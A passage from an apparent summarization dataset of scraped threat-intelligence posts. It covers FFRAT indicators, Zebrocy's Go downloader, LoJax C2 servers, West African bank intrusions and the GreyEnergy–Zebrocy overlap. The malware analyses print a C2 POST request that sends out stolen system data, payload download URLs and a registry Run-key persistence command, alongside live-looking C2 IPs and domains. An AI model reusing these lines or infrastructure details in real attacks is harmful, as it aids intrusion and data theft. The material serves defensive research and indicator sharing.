DLLs:0CB3B3F5408FE40C7F3DD323272BE662335C4B979FBB766BE4AA6FC2C84CC6F20E804464F1669674B83E6605D8C4617D8D2B6EFB36532C71B654B61E5C71B8F921961087CC10A4666A263BA3841BA571837181B0288DE533FE9F114E8269E7B924D7C59076DF6B6E710E80E708513F0D95A23869B5EA43772B5AF9DB92786B515B3A0FCCFD1F652BBF71B9F7757A38E5DB0D0ED5A377A821E5E5BF886461E924632519CA40720D180205BB8405A1BC3888F69899F59DEC53A2EAF06F08A3D86E908CFF61E49A89443C11F56BB822FB0139967031052E1F456AA3BA80F2E9612C98CED0CBE7FDB09810D9B2DED5D0B73EC9659AFE179C1D911EDAB373AE630ECE9E8578E0EA406F987F0E227810408BEC29864A237C0A745D374971618B35AFFED4E80E1208BA43272F368D0ECA38F0467D70745A42ABA4D4AC7E333A64201790EA0062BA2D26D6C3948E93A01C12ED413327E1E428F25495844B14DFF3DE7C9CFEC88F4BAAD17942EDF29C1F0A6036D1F30BD7435380247BDCD55F2B7E163A1AFF-RAT 32-bit DLLsile-Based:%WINDIR%\System32\curl.dat%WINDIR%\System32\frtest.dat%WINDIR%\System32\frmonk.dat%WINDIR%\System32\trtest.dat%WINDIR%\System32\prfi0814.dat%WINDIR%\System32\RCoResX64.dat%WINDIR%\Media\Windows Config.wav%WINDIR%\Media\WindowsMainSound.wavIP Addresses:103.27.108.121211.55.29.5559.188.16.14768.68.43.149Domains:aunetdns(dot)comcapstone.homeftp(dot)netcxman.wicp(dot)netdns.gogogogoogle(dot)comdns-1.verifysign(dot)orgdns1-1.verifysign(dot)orgfan001.yahoolive(dot)usftpseck.ftp21(dot)netgame.googlecustomservice(dot)comgame.googlesoftservice(dot)netgifa.cechire(dot)comhehe000002.3322(dot)orghookyouxx.blog.163(dot)comhuangxiaoxian.3utilities(dot)cominfo.playdr2(dot)comlatecoere.blogdns(dot)comlinuxdns.sytes(dot)netlogin.gamepoer7(dot)comluotuozhizhu.blog.163(dot)compcal2.dwy(dot)ccpcal2.yahoolive(dot)uspf.playdr2(dot)compplove.bounceme(dot)netqemail.gotdns(dot)comrp.gamepoer7(dot)comsvhost(dot)orgtk.u2xu2(dot)comupdate.gogogogoogle(dot)comwelcome.dnsd(dot)infowelcometohome.strangled(dot)netwucy08.eicp(dot)netwuzhiting.3322(dot)orgwww.rooter(dot)tkwww.tibetonline(dot)infowww.vxea(dot)comzz.alltosec(dot)comCertificates:Issued to: Beijing Wintone Science & Technology Corporation Ltd.Thumbprint: ?5b90748fdac1631de2c5286544919983d0716156Serial Number: ?7a c3 9e 72 df d5 85 d9 01 9f 91 80 02 68 f3 efIssued to: Binzhou XinPin Technology Co.Thumbprint: ?c1fdd5f5cb4b69be78c7c8c946890d5726fc4d42Serial Number: ?39 1e 36 3e c8 2a d7 61 3d b4 78 c1 78 18 0e 8bIssued to: Yijiajian (Amoy) Jiankan Tech Co.Thumbprint: ?4bb350bea954ac8ceae09ff6859989c1029b9cdbSerial Number: ?65 4b 40 6d e3 88 ec 2a ec 25 3f f2 ba 4c 4b bdIssued to: SHENZHEN HONGQI ELECTRONICS CO.Thumbprint: ?e8d1a4f5d4a903241f6de259ff00e7305423bdf7Serial Number: ?5b 84 5f 7e 7c 6e 68 04 6b f4 34 89 5d e4 86 51Issued to: Xuzhou Chenji Technology Co.Thumbprint: ?c184466ce5685d208cd1d38880a1fb8763322447Serial Number: ?19 ce 16 72 10 71 45 e0 6f dc 45 fa 2b 75 3f 0bIssued to: Hangzhou Degou Information Technology Co.Thumbprint: ?96d5e6925aa3c9928f393d23e91abd0efadd16acSerial Number: ?64 47 7c 85 f2 6c 2c a6 7d 76 46 84 34 26 3e 0eIssued to: Shenzhen Jinxian Technology Co.Thumbprint: ?6e165fe061bc4eef38bfbda414da61a0c42491b2Serial Number: ?54 87 1d 9a b3 8d 19 02 c3 21 15 f4 c0 79 7e a2Issued to: Zhengzhoushi Tiekelian Information Technology Co.Thumbprint: ?572973c5c86134276404fe524ab35cf3829ebaccSerial Number: ?55 ab 71 a3 f9 dd e3 ef 20 c7 88 dd 1d 5f f6 c3Issued to: Zhengzhou Wanxiang Gaoke Information Technology Co.Thumbprint: ?9a2ea03faf2219962345fc4ffbc348507b725c81Serial Number: ?2e 7c 84 da 11 c9 80 26 63 45 24 b1 e1 8b 0f bd* Please note that some of the domains listed have been sink holed by security researchers";FFRAT is a family of malware used in a number of targeted attacks over at least the last five years. It is by no means a new threat, but it is still actively used and developed and worthy of a breakdown in an effort to defend against it.FFRat malware has managed to stay under the radar and does not yet have robust, widespread industry coverage. In this post, we're going to look at a recent sample the Threat Guidance team came across.The DropperThe sample we'll be analyzing is the main dropper component:SHA256: 7a4528821e4b26524ce9c33f04506616f57dfc6ef3ee8921da7b0c39ff254e4eThe first thing the dropper does is identify the architecture of the targeted host. If the host is a 64bit system, then a 64bit version of the dropper will be written to disk and executed, as shown below:Path: \%WinDir%\Temp\S[8 Byte Hex String].datSHA256: 8ef257058cbb22fbab54837dc0af1bdd93c2a6bae18ca4a26e0a436656e591e1Otherwise, if the host is a 32bit system, then the 32bit dropper will continue to its next phase of execution.Both droppers (32 and 64bit) will proceed to decrypt and decompress an embedded DLL named SetupDll.dll. This DLL contains the primary functionality of;en;{'r': 0.1434010152284264, 'p': 0.9495798319327731, 'f': 0.24917309584593192};{'r': 0.12076923076923077, 'p': 0.9181286549707602, 'f': 0.21346022908060253};{'r': 0.1434010152284264, 'p': 0.9495798319327731, 'f': 0.24917309584593192}
https://securelist.com/a-zebrocy-go-downloader/89419/;A Zebrocy Go Downloader;"Last year at SAS2018 in Cancun, Mexico, ""Masha and these Bears"" included discussion of a subset of Sofacy activity and malware that we call ""Zebrocy"", and predictions for the decline of SPLM/XAgent Sofacy activity coinciding with the acceleration of Zebrocy activity and innovation. Zebrocy was initially introduced as a Sofacy backdoor package in 2015, but the Zebrocy cluster has carved a new approach to malware development and delivery to the world of Sofacy. In line with this approach, we will present more on this Zebrocy innovation and activity playing out at SAS 2019 in Singapore.Our colleagues at Palo Alto recently posted an analysis of Zebrocy malware. The analysis is good and marked their first detection of a Zebrocy Go variant as October 11, 2018. Because there is much to this cluster, clarifying and adding to the discussion is always productive.Our original ""Zebrocy Innovates - Layered Spearphishing Attachments and Go Downloaders"" June 2018 writeup documents the very same downloader, putting the initial deployment of Zebrocy Go downloader activity at May 10, 2018. And while the targeting in the May event was most likely different from the October event, we documented this same Go downloader and same C2 was used to target a Kyrgyzstan organization. Also interesting is that the exact same system was a previous Zebrocy target earlier in 2018. So, knowing that this same activity is being reported on as ""new"" six months later tells us a bit about the willingness of this group to re-use rare components and infrastructure across different targets.While they are innovating with additional languages, as we predicted in early 2018, their infrastructure and individual components may have more longevity than predicted. Additionally, at the beginning of 2018, we predicted the volume of Zebrocy activity and innovation will continue to increase, while the more traditional SPLM/XAgent activity will continue to decline. Reporting on SPLM/XAgent certainly has followed this course in 2018 as SPLM/XAgent detections wind down globally, as has Sofacy's use of this malware from our perspective.Much of the content below is reprinted from our June document.The Sofacy subset we identify as ""Zebrocy"" continues to target Central Asian government related organizations, both in-country and remote locations, along with a new middle eastern diplomatic target. And, as predicted, they continue to build out their malware set with a variety of scripts and managed code. In this case, we see new spearphishing components - an LNK file maintaining powershell scripts and a Go-implemented system information collector/downloader. This is the first time we have observed a well-known APT deploy malware with this compiled, open source language ""Go"". There is much continued recent Zebrocy activity using their previously known malware set as well.Starting in May 2018, Zebrocy spearphished Central Asian government related targets directly with this new Go downloader. For example, the attachment name included one ""30-144.arj"" compressed archive, an older archiver type handled by 7zip, Rar/WinRAR, and others. Users found ""30-144.exe"" inside the archive with an altered file icon made to look like the file was a Word document (regardless of the .exe file extension). And in a similar fashion in early June, Zebrocy spearphished over a half-dozen accounts targeting several Central Asian countries' diplomatic organizations with a similar scheme ""2018-05-Invitation-Letter(1).rar//2018-05-Invitation-Letter(pril).docx"", sending out a more common Zebrocy Delphi downloader.In other cases, delivery of the new Go downloader was not straightforward. The new Go downloader also was delivered with a new spearphishing object that rolls up multiple layers of LNK file, powershell scripts, base64 encoded content, .docx files and the Go downloader files. The downloader is an unusually large executable at over 1.5mb, written to disk and launched by a powershell script. So the attachment that arrived over email was large.The powershell script reads the file's contents from a very large LNK file that was included as an email attachment, and then writes it to disk along with a Word document of the same name. So, launching the downloader is followed with the opening of an identically named decoy word document with ""WINWORD.EXE"" /n ""***\30-276(pril).docx"" /o"". The downloader collects a large amount of system information and POSTs it to a known Zebrocy C2, then pulls down known Zebrocy Delphi payload code, launches it, and deletes itself.We observed previous, somewhat similar spearphishing scenarios with an archive containing .LNK, .docx, and base64 encoded executable code, delivering offensive Finfisher objects in separate intrusion activity clusters. This activity was not Sofacy, but the spearphishing techniques were somewhat similar - the layered powershell script attachment technique is not the same, but not altogether new.And, it is important to reiterate that these Central Asian government and diplomatic targets are often geolocated remotely. In the list of target geolocations, notice countries like South Korea, the Netherlands, etc. In addition to Zebrocy Go downloader data, this report provides data on various other observed Zebrocy malware and targets over the past three months.SpreadingMostly all observed Zebrocy activity involves spearphishing. Spearphish attachments arrive with .rar or .arj extensions. Filename themes include official government correspondence invitations, embassy notes, and other relevant items of interest to diplomatic and government staff. Enclosed objects may be LNK, docx, or exe files.A decoy PDF that directly targeted a Central Asian nation is included in one of the .arj attachments alongside the Go downloader. The content is titled ""Possible joint projects in cooperation with the International Academy of Sciences"" and lists multiple potential projects requiring international cooperation with Tajikistan and other countries. This document appears to be a legitimate one that was stolen, created mid-May 2018. While we cannot reprint potentially leaked information publicly, clearly, the document was intended for a Russian-language reader.Powershell launcher from within LNKThe LNK containing two layers of powershell script and base64 encoded content is an unusual implementation - contents from a couple are listed at the technical appendix. When opened, the script opens the shortcut file it is delivered within (""30-276(pril).docx.lnk""), pulls out the base64 encoded contents (in one case, from byte 3507 to byte 6708744), base64 decodes the content and another layer of the same powershell decoding. This script writes two files to disk as ""30-276(pril).exe"" and ""30-276(pril).docx"" and opens both files, leading to the launch of the Go language system information collector/downloader and a decoy Word document.Go System Information Collector/DownloaderMd5 333d2b9e99b36fb42f9e79a2833fad9cSha256 fcf03bf5ef4babce577dd13483391344e957fd2c855624c9f0573880b8cba62eSize 1.79mb (upx packed - 3.5mb upx unpacked)CompiledOn Stomped (Wed Dec 31 17:00:00 1969)Type PE 32-bit Go executableName 30-276(pril).exeThis new Go component not only downloads and executes another Zebrocy component, but it enumerates and collects a fair amount of system data for upload to its C2, prior to downloading and executing any further modules. It simply collects data using the systeminfo utility, and in turn makes a variety of WMI calls.After collecting system information, the backdoor calls out to POST to its hardcoded C2, in this case a hardcoded IP/Url. Note that the backdoor simply uses the default Go user-agent:""POST /technet-support/library/online-service-description.php?id_name=345XXXD5HTTP/1.1Host: 89.37.226.148User-Agent: Go-http-client/1.1""With this POST, the module uploads all of the system information it just gathered with the exhaustive systeminfo utility over http: hostname, date/time, all hardware, hotfix, service and software information.The module then retrieves the gzip'd, better known Zebrocy dropper over port 80 as part of an encoded jpg file, writes it to disk, and executes from a command line:""cmd /C c:\users\XXX\appdata\local\Identities\{83AXXXXX-986F-1673-091A-02XXXXXXXXXX}\w32srv.exe""and adds a run key persistence entry with the system utility reg.exe:cmd /C ""reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Driveupd /dc:\users\XXX\appdata\local\Identities\{83AXXXXX-986F-1673-091A-02XXXXXXXXXX}\w32srv.exe /f""Zebrocy AutoIT DropperMd5 3c58ed6913593671666283cb7315dec3Sha256 96c3700ad639faa85982047e05fbd71c3dfd502b09f9860685498124e7dbaa46Size 478.5kb (upx-packed)Compiled Fri Apr 27 06:40:32 2018Type PE32 AutoIT executablePath, Name appdata\Identities\{83AF1378-986F-1673-091A-02681FA62C3B}\w32srv.exeThis AutoIT dropper writes out a Delphi payload, consistent with previous behavior going back to November 2015, initially described in our January 2016 report ""Zebrocy - Sofacy APT Deploys New Delphi Payload"".Zebrocy Delphi PayloadMd5 2f83acae57f040ac486eca5890649381Sha256 f9e96b2a453ff8922b1e858ca2d74156cb7ba5e04b3e936b77254619e6afa4e8Size 786kbCompiled Fri Jun 19 16:22:17 1992 (stomped/altered)Type PE32 exe [v4.7.7] Path, Name c:\ProgramData\Protection\Active\armpro.exeInterestingly the final payload reverts back to an earlier version [v4.7.7]. A ""TURBO"" command is missing from this Zebrocy Delphi backdoor command list .SYS_INFOSCAN_ALLSCAN_LISTDOWNLOAD_DAYDOWNLOAD_LISTCREATE_FOLDERUPLOAD_FILEFILE_EXECUTEDELETE_FILESREG_WRITE_VALUEREG_READ_VALUEREG_DELETE_VALUEREG_GET_KEYS_VALUESREG_DELETE_KEYKILL_PROCESSCONFIGGET_NETWORKCMD_EXECUTEDOWNLOAD_DATEDELETE_FOLDERUPLOAD_AND_EXECUTE_FILESCREENSHOTSFILE_EXECUTESET_HIDDEN_ATTRSTARTSTOPKILL_MYSELFInfrastructureZebrocy backdoors are configured to directly communicate with IP assigned web server hosts over port 80, and apparently the group favors Debian Linux for this part of infrastructure: Apache 2.4.10 running on Debian Linux. A somewhat sloppy approach continues, and the group set up and configured one of the sites with digital certificates using a typical Sofacy-sounding domain that they have not yet registered: ""weekpost.org"". Digital certificate details are provided in the appendix.These ""fast setup"" VPS servers run in ""qhoster[.]com"" can be paid for with Webmoney, Bitcoin, Litecoin, Dash, Alfa Click, Qiwi, transfers from Sberbank Rossii, Svyaznoy, Promsvyazbank, and more. Although, it appears that Bitcoin and Dash may be of the most interest to help ensure anonymous transactions. Dataclub provides similar payment methods:One of the VPS IP addresses (80.255.12[.]252) is hosted in the ""afterburst[.]com""/Oxygem range. This service is the odd one out and is unusual because it only supports VISA/major credit cards and Paypal at checkout. If other payment options are provided, they are not a part of the public interface.Victims and TargetingZebrocy Go downloader 2018 targets continue to be Central Asian government foreign policy and administrative related. Some of these organizations are geolocated in-country, or locally, and some are located remotely. In several cases, these same systems have seen multiple artefacts from Zebrocy over the course of 2017 and early 2018:* Kazakhstan* Kyrgyzstan* Azerbaijan* TajikistanAdditional recent Zebrocy target geo-locations (targeting various Central Asian/ex-USSR local and remote government locations):* Qatar* Ukraine* Czech Republic* Mongolia* Jordan* Germany* Belgium* Iran* Turkey* Armenia* Afghanistan* South Korea* Turkmenistan* Kazakhstan* Netherlands* Kuwait* United Arab Emirates* Spain* Poland* Qatar* Oman* Switzerland* Mongolia* Kyrgyzstan* United KingdomAttributionZebrocy activity is a known subset of Sofacy activity. We predicted that they would continue to innovate within their malware development after observing past behavior, developing with Delphi, AutoIT, .Net C, Powershell, and now ""Go"" languages. Their continued targeting, phishing techniques, infrastructure setup, technique and malware innovation, and previously known backdoors help provide strong confidence that this activity continues to be Zebrocy.ConclusionsZebrocy continues to maintain a higher level of volume attacking local and remote ex-USSR republic Central Asian targets than other clusters of targeted Sofacy activity. Also interesting with this Sofacy sub-group is the innovation that we continue to see within their malware development. Much of the spearphishing remains thematically the same, but the remote locations of these Central Asian targets are becoming more spread out - South Korea, Netherlands, etc. While their focus has been on Windows users, it seems that we can expect the group to continue making more innovations within their malware set. Perhaps all their components will soon support all OS platforms that their targets may be using, including Linux and MacOS. Zebrocy spearphishing continues to be characteristically higher volume for a targeted attacker, and most likely that trend will continue.And, as their spearphishing techniques progress to rival Finfisher techniques without requiring zero-day exploitation, perhaps Zebrocy will expand their duplication of more sources of open source spearphishing techniques.IoCGo downloader333d2b9e99b36fb42f9e79a2833fad9cIPs80.255.12.25289.37.226.14846.183.218.34185.77.131.11092.114.92.128URLs/technet-support/library/online-service-description.php?id_name=XXXXX/software-apptication/help-support-apl/getidpolapl.phpFile - paths and names30-276(pril).exe30-144-(copy).exeEmbassy Note No.259.docx.lnk2018-05-Invitation-Letter(1).rar//2018-05-Invitation-Letter(pril).docx";"The ITSecurity report provides data on various other observed Zebrocy malware and targets over the past three months. Mostly all observed Zebrocy activity involves spearphishing. Spearphish attachments arrive with .rar or .arj extensions. Filename themes include official government correspondence invitations, embassy notes, and other relevant items of interest to diplomatic and government staff. Enclosed objects may be LNK, docx, or exe files. A decoy PDF that directly targeted a Central Asian nation is included in one of the .arj attachments alongside the Go downloader. The content is titled ""Possible joint projects in cooperation with the International Academy of Sciences"" and lists multiple potential projects requiring international cooperation with Tajikistan and other countries. No response. Zebrocy continues to maintain a higher level of volume attacking local and remote exUSSR republic Central Asian targets than other clusters of targeted Sofacy activity. Also interesting with this Sofacy subgroup is the innovation that we continue to see within their malware development. Much of the spearphishing remains thematically the same, but the remote locations of these Central Asian targets are becoming more spread out South Korea, Netherlands, etc. While their focus has been on Windows users, it seems that we can expect the group to continue making more innovations within their malware set. Perhaps all their components will soon support all OS platforms that their targets may be using, including Linux and MacOS. Zebrocy spearphishing continues to be characteristically higher volume for a targeted attacker, and most likely that trend will continue.And, as their spearphishing techniques progress to rival Finfisher techniques without requiring zeroday exploitation, perhaps Zebrocy will expand their duplication of more sources of open source spearphishing techniques.Io";en;{'r': 0.1983663943990665, 'p': 0.96045197740113, 'f': 0.328820113216612};{'r': 0.14837153196622438, 'p': 0.9389312977099237, 'f': 0.2562499976432509};{'r': 0.1983663943990665, 'p': 0.96045197740113, 'f': 0.328820113216612}
https://www.netscout.com/blog/asert/lojax-fancy-2016;LoJax: Fancy since 2016;"Executive SummaryIn May of last year, ASERT Researchers reported on LoJax, a double-agent leveraging legitimate software to phone home to malicious command and control (C2) servers. Since the publication of our research, we've monitored a number of new malware samples. We also conducted additional research into infrastructure we believe Fancy Bear (APT28) operators use as part of their toolkit. We created fingerprints that enabled us find additional LoJax servers using our ATLAS collection platform. The research identified multiple live LoJax servers. All of the IPs uncovered by our collection platform have been published by other researchers, however, we also uncovered the suspected corresponding C2 domains, some of which have yet to be seen in LoJax. Since exposing the use of LoJax in May 2018, security researchers proved Fancy Bear used it as part of an UEFI based rootkit in September of 2018, making LoJax resilient to hard drive replacements and Windows OS re-installs. This blog post reveals activity around Fancy Bear's LoJax infrastructure.NOTE: NETSCOUT APS/AED Enterprise Security Products detect and block on all activity noted in this report.Key FindingsTwo of of the identified LoJax command and control servers were live at the time of this analysis.PassiveDNS research uncovered additional suspected LoJax domains. We have not seen some of the suspect domains used in any known malware samples to date.Based on the ongoing infrastructure analysis, ASERT assesses with moderate confidence that Fancy Bear, LoJax operations started in late 2016.LoJax Servers Across the InternetASERT Researchers constructed a network scanning fingerprint using intel gathered from a confirmed LoJax C2. Using this fingerprint, ASERT scanned our collection platform looking for additional LoJax C2 servers. The first round of scanning our collections resulted in identifying the following live C2 servers last yearTable 1: Live C2 - Fall 2018Scanner Found IP 185.86.151[.]2 169.239.128[.]133 185.181.102[.]201 46.21.147[.]76 169.239.129[.]121 46.21.147[.]71 86.106.131[.]54A new scan in early 2019 revealed only two of the seven prior responsive servers remain active (Table 2).Table 2: Live C2 - Early 2019Scanner Found IP 169.239.128[.]133 185.86.151[.]2Using DNS records, ASERT assess with moderate confidence the following corresponding LoJax domains correlate with each IP address below. We made this determination based on the timeline of when the IP addresses were active (Table 3).Table 3: C2 IP to Domain MappingScanner Found IP ASERT Researched Domain Mapping 185.86.151[.]2 unigymboom[.]com 169.239.128[.]133 ntpstatistics[.]com 185.181.102[.]201 moldstream[.]md 46.21.147[.]76 vsnet[.]co 169.239.129[.]121 visualrates[.]com 46.21.147[.]71 regvirt[.]com 86.106.131[.]54 elaxo[.]orgCombing through known LoJax samples, we found two of the above domains correspond with the following LoJax samples (Table 4):Table 4: Known LoJax Samples to Domain MappingASERT Researched Domain Mapping /Sample C2 Sample MD5 regvirt[.]com 89503b7935a05b1d26cb26ce3793a3fb regvirt[.]com cffcae5c5551b4b9489fec5d56269d84 elaxo[.]org bda5f83ee4a6d64d1057f19a2a1ef071 elaxo[.]org 9be30e2c2e185ccb6cdbbf585d368393 elaxo[.]org f3c6e16f0dd2b0e55a7dad365c3877d4Note: the domain elaxo[.]org no longer pointed to the LoJax C2 IP as of May 2018, but the LoJax server on that IP was still active in Fall 2018. In addition to ASERT and ESET's research, UK NCSC's report (Oct 2018) included the same IP addresses found from our fingerprinting exercise. Further pDNS research revealed the suspected C2 domains tied to most of those IP addresses. ASERT maintains a moderate confidence with the following IP to domain mappings (Table 5). A subset of these domains appeared in known LoJax samples:ASERT Researched Domain Mapping UK NCSC IP UNKNOWN 185.86.148[.]184 moldstream[.]md 185.181.102[.]201 visualrates[.]com 169.239.129[.]121 regvirt[.]com 46.21.147[.]71 ntpstatistics[.]com 169.239.128[.]133 oiatribe[.]com 162.208.10[.]66 msfontserver[.]com 179.43.158[.]20 treckanalytics[.]com 94.177.12[.]150 unigymboom[.]com 185.86.151[.]2 sysanalyticweb[.]com 54.37.104[.]106 remotepx[.]net 85.204.124[.]77 vsnet[.]co 46.21.147[.]76 hp-apps[.]com 185.86.149[.]116 jflynci[.]com 185.86.151[.]104 peacefund[.]eu 185.183.107[.]40 elaxo[.]org 86.106.131[.]54 oiagives[.]com 162.208.10[.]66 UNKNOWN 93.113.131[.]103 webstp[.]com 185.94.191[.]65Using the above mappings, we iterated through our repository of malware samples looking for matches. We managed to identify the following LoJax samples (Table 6) using the mapped domains in Table 5 (above).ASERT Researched C2 Mapping / Sample C2 Sample MD5 regvirt[.]com 89503b7935a05b1d26cb26ce3793a3fb regvirt[.]com cffcae5c5551b4b9489fec5d56269d84 sysanalyticweb[.]com 6eaa1ff5f33df3169c209f98cc5012d0 sysanalyticweb[.]com f1df1a795eb784f7bfc3ba9a7e3b00ac remotepx[.]net e5db592704f30d42537b1257e79ff223 jflynci[.]com f336379bd4a129f0851a24ccea47b4ec elaxo[.]org bda5f83ee4a6d64d1057f19a2a1ef071 elaxo[.]org 9be30e2c2e185ccb6cdbbf585d368393 elaxo[.]org f3c6e16f0dd2b0e55a7dad365c3877d4 webstp[.]com 9157f70faaedf66688fc11f4abca83e2 webstp[.]com 73ea983ec9c39fb820d086acdf439c95Assuming the mapping is correct, several of the domains haven't been used with LoJax samples in the wild. Our research included numerous open source and proprietary malware repositories. Yet, we've not uncovered any samples that use the corresponding domains (Table 7). It's possible that the currently active suspected LoJax C2 domains are either in use today or reserved for future use.Scanner Found IP ASERT Researched Domain Mapping Last Active 185.86.151[.]2 unigymboom[.]com Current 169.239.128[.]133 ntpstatistics[.]com Current 185.181.102[.]201 moldstream[.]md Fall 2018 46.21.147[.]76 vsnet[.]co Fall 2018 169.239.129[.]121 visualrates[.]com Fall 2018IMPORTANT: The ntpstatistics[.]com and unigymboom[.]com domains still point to live C2 servers and can still be contacted by LoJax's agents.LoJax Domain History ForensicsWe took things a step further by looking at domain registration information. The goal was to find when new confirmed and suspected domains came online. The chart below shows this activity over time. It outlines when Fancy Bear possibly began standing up LoJax C2 servers (Figure 1).Figure 1: New Confirmed and Suspected Domain RegistrationsNote: Aside from the initial hits in 2004 and 2006, the primary spike in activity occurred starting in late 2016. Based on currently visibility, ASERT believes LoJax began in late 2016. The spikes in 2006 may indicate previous ownership of domains, rather than testing by the Fancy Bear operators. However, we cannot rule out the possibility they owned the domains previous to their main campaigns kicking off in 2016. The software hijacked by the actors had a compile date in 2008. If accurate, it indicates that the earlier activity was erroneous or unrelated to current operations.SummaryContinued diligence in tracking activity related to LoJax proved that the actors still maintain live C2 servers. They may also have additional ongoing operations outside the ""in the wild"" use reported by ESET activity (September, 2018). Even with all of the publicity around Lojax, Fancy Bear operations did not take the publicly disclosed servers offline. Because these C2 servers have a long shelf life, organizations should ensure they incorporate the IOCs into their defensive posture. This longevity underscores the importance that LoJax C2s remain in active defense postures for longer periods of time.";ASERT Researchers constructed a network scanning fingerprint using intel gathered from a confirmed LoJax C2. Using this fingerprint, ASERT scanned our collection platform looking for additional LoJax C2 servers. The first round of scanning our collections resulted in identifying the following live C2 servers last year (Table 1). Table 2: Live C2 Early 2019 Scanner Found IP 169.239.128[. ]133 185.86.151[. ]2 Using DNS records, ASERT assess with moderate confidence the following corresponding LoJax domains correlate with each IP address below. We made this determination based on the timeline of when the IP addresses were active (Table 3). Table 3: C2 IP to Domain Mapping Scanner Found IP ASERT Researched Domain Mapping 185.86.151[. ]2 unigymboom[. ]com 169.239.128[. ]133 ntpstatistics[. ]com 185. ASERT Researched C2 Mapping / Sample C2 Sample MD5 regvirt[. ]com 89503b7935a05b1d26cb26ce3793a3fb regvirt[. ]com cffcae5c5551b4b9489fec5d56269d84 sysanalyticweb[. ]com 6eaa1ff5f30d42537b1257e795d368393 elaxo[. ]org bda5f83ee4a6d64d1057f19a2;en;{'r': 0.18664047151277013, 'p': 0.9693877551020408, 'f': 0.31301482431044736};{'r': 0.1275239107332625, 'p': 0.8955223880597015, 'f': 0.22325581177122342};{'r': 0.18664047151277013, 'p': 0.9693877551020408, 'f': 0.31301482431044736}
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/african-financial-attacks;West African Financial Institutions Hit by Wave of Attacks;Banks and other financial institutions in a number of West African countries have been targeted by cyber criminals employing a range of commodity malware and living off the land tools.The attacks have been underway since at least mid-2017. To date, organizations in Cameroon, Congo (DR), Ghana, Equatorial Guinea, and Ivory Coast have been affected.Who is behind these attacks remains unknown. They could be the work of a single group or, more likely, several different groups employing similar tactics.Four types of attacksSymantec has observed four distinct attack campaigns directed against financial targets in Africa. The first has been underway since at least mid-2017 and has targeted organizations in Ivory Coast and Equatorial Guinea. The attackers infected victims with commodity malware known as NanoCore (Trojan.Nancrat) and were also observed using PsExec, a Microsoft Sysinternals tool used for executing processes on other systems, on infected computers. Lure documents used by the attackers referred to a West African bank which has operations in several countries in the region. Some tools used in these attacks are similar to tools mentioned in a 2017 SWIFT alert, indicating the attackers may have been attempting to perform financial fraud.The second type of attack began in late 2017 and targeted organizations in Ivory Coast, Ghana, Congo (DR), and Cameroon. The attackers used malicious PowerShell scripts to infect their targets and also used the credential-stealing tool Mimikatz (Hacktool.Mimikatz). They also made use of UltraVNC, an open-source remote administration tool for Microsoft Windows. The attackers then infected computers with the commodity malware known as Cobalt Strike (Trojan.Agentemis) which is capable of opening a backdoor on the computer, communicating with a command and control (C&C) server, and downloading additional payloads. Communication with the C&C server was handled by dynamic DNS infrastructure, which helped shield the location of the attackers.The third type of attack was directed against an organization in Ivory Coast. This organization had also been targeted by the second campaign. This second attack also involved the use of commodity malware, in this case the Remote Manipulator System RAT (Backdoor.Gussdoor), alongside Mimikatz and two custom Remote Desktop Protocol (RDP) tools. Since Mimikatz can be used to harvest credentials and RDP allows for remote connections to computers, it's likely the attackers wanted additional remote access capability and were interested in moving laterally across the victim's network.The fourth type of attack began in December 2018 and was directed against organizations in Ivory Coast. The attackers used off-the-shelf malware known as Imminent Monitor RAT (Infostealer.Hawket).;West African banks and other financial institutions have been targeted by cyber criminals employing a range of commodity malware and living off the land tools. The attacks have been underway since at least mid2017. To date, organizations in Cameroon, Congo (DR), Ghana, Equatorial Guinea, and Ivory Coast have been affected. Who is behind these attacks remains unknown. They could be the work of a single group or, more likely, several different groups employing similar tactics. Four types of attacks Symantec has observed four distinct attack campaigns directed against financial targets in Africa. The first has been underway since at least mid2017 and has targeted organizations in Ivory Coast and Equatorial Guinea. The attackers infected victims with commodity malware known as NanoCore (Trojan.Nancrat) and were also observed using PsExec, a Microsoft Sysinternals tool used for executing processes on other systems, on infected computers. Lure documents used by the attackers referred to a West African bank which has operations in several countries in the region. Some tools used in these attacks are similar to tools mentioned in a 2017 SWIFT alert, indicating the attackers may have been attempting to perform financial fraud. The second type of attack began in late 2017 and targeted organizations in Ivory Coast, Ghana, Congo (DR), and Cameroon. The attackers used malicious PowerShell scripts to infect their targets and also used the credentialstealing tool Mimikatz (Hacktool.Mimikatz). They also made use of UltraVNC, an opensource remote administration tool for Microsoft Windows. The attackers then infected computers with the commodity malware known as Cobalt Strike (Trojan.Agentemis) which;en;{'r': 0.6515837104072398, 'p': 0.9664429530201343, 'f': 0.7783783735677138};{'r': 0.6032608695652174, 'p': 0.9446808510638298, 'f': 0.736318403203441};{'r': 0.6515837104072398, 'p': 0.9664429530201343, 'f': 0.7783783735677138}
https://securelist.com/greyenergys-overlap-with-zebrocy/89506/;GreyEnergy’s overlap with Zebrocy;"In October 2018, ESET published a report describing a set of activity they called GreyEnergy, which is believed to be a successor to BlackEnergy group. BlackEnergy (a.k.a. Sandworm) is best known, among other things, for having been involved in attacks against Ukrainian energy facilities in 2015, which led to power outages. Like its predecessor, GreyEnergy malware has been detected attacking industrial and ICS targets, mainly in Ukraine.Kaspersky Lab ICS CERT has identified an overlap between GreyEnergy and a Sofacy subset called ""Zebrocy"". The Zebrocy activity was named after malware that Sofacy group began to use since mid-November 2015 for the post-exploitation stage of attacks on its victims. Zebrocy's targets are widely spread across the Middle East, Europe and Asia and the targets' profiles are mostly government-related.Both sets of activity used the same servers at the same time and targeted the same organization.DetailsServersIn our private APT Intel report from July 2018 ""Zebrocy implements new VBA anti-sandboxing tricks"", details were provided about different Zebrocy C2 servers, including 193.23.181[.]151.In the course of our research, the following Zebrocy samples were found to use the same server to download additional components (MD5):7f20f7fbce9deee893dbce1a1b62827d170d2721b91482e5cabf3d2fec091151eae0b8997c82ebd93e999d4ce14dedf5a5cbf5a131e84cd2c0a11fca5ddaa50ac9e1b0628ac62e5cb01bf1fa30ac8317The URL used to download additional data looks as follows:hxxp://193.23.181[.]151/help-desk/remote-assistant-service/PostId.php?q={hex}This same C2 server was also used in a spearphishing email attachment sent by GreyEnergy (aka FELIXROOT), as mentioned in a FireEye report. Details on this attachment are as follows:The file (11227eca89cc053fb189fac3ebf27497) with the name ""Seminar.rtf"" exploited CVE-2017-0199""Seminar.rtf"" downloaded a second stage document from: hxxp:// 193.23.181[.]151 /Seminar.rtf (4de5adb865b5198b4f2593ad436fceff, exploiting CVE-2017-11882)/Seminar.rtf 